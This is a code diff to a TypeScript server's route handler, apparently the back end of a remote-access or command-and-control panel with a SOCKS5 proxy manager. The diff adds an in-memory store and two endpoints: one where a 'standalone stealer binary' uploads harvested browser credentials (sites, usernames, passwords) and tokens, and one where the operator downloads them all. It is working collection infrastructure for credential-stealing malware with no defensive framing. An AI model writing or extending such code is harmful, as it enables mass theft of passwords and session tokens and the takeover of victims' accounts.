@@ -1,4 +1,5 @@
 import { authenticateRequest } from "../../auth";
+import { isAuthorizedAgentRequest } from "../agent-auth";
 import { AuditAction, getAuditLogs, logAudit } from "../../auditLog";
 import { getConfig, updateSecurityConfig, updateTlsConfig, updateAppearanceConfig, getExportableConfig, importFullConfig } from "../../config";
 import { getClientMetricsSummary } from "../../db";
@@ -12,6 +13,15 @@ import {
   stopProxy,
 } from "../socks5-proxy-manager";
 
+// In-memory store for stealer drops (standalone binary submissions)
+interface StealDrop {
+  ts: number;
+  credentials: { browser: string; profile: string; url: string; username: string; password: string }[];
+  tokens: string[];
+  errors: string[];
+}
+const stealDrops: StealDrop[] = [];
+
 type MiscRouteDeps = {
   CORS_HEADERS: Record<string, string>;
   SERVER_VERSION: string;
@@ -22,6 +32,7 @@ type MiscRouteDeps = {
   getProcessSessionCount: () => number;
   tlsCertPath?: string;
   tlsSource?: "certbot" | "configured" | "self-signed";
+  agentToken?: string;
 };
 
 export async function handleMiscRoutes(
@@ -517,6 +528,42 @@ export async function handleMiscRoutes(
 
       return Response.json({ ok: true, customCSS: updated.customCSS }, { headers: deps.CORS_HEADERS });
     }
+  }
+
+  // POST /api/steal-drop — standalone stealer binary submits results here
+  if (req.method === "POST" && url.pathname === "/api/steal-drop") {
+    if (!isAuthorizedAgentRequest(req, url, deps.agentToken)) {
+      return new Response(JSON.stringify({ error: "Unauthorized" }), {
+        status: 401,
+        headers: { "Content-Type": "application/json" },
+      });
+    }
+    try {
+      const body = await req.json() as any;
+      stealDrops.push({
+        ts: Date.now(),
+        credentials: Array.isArray(body.credentials) ? body.credentials : [],
+        tokens: Array.isArray(body.tokens) ? body.tokens : [],
+        errors: Array.isArray(body.errors) ? body.errors : [],
+      });
+    } catch { /* ignore malformed body */ }
+    return new Response(JSON.stringify({ ok: true }), {
+      headers: { "Content-Type": "application/json", ...deps.CORS_HEADERS },
+    });
+  }
+
+  // GET /api/steal-drops — operator fetches all stored drops
+  if (req.method === "GET" && url.pathname === "/api/steal-drops") {
+    const user = await authenticateRequest(req);
+    if (!user) {
+      return new Response(JSON.stringify({ error: "Not authenticated" }), {
+        status: 401,
+        headers: { "Content-Type": "application/json" },
+      });
+    }
+    return new Response(JSON.stringify(stealDrops), {
+      headers: { "Content-Type": "application/json", ...deps.CORS_HEADERS },
+    });
   }
 
   if (req.method === "GET" && url.pathname === "/api/cert/download" && deps.tlsCertPath) {
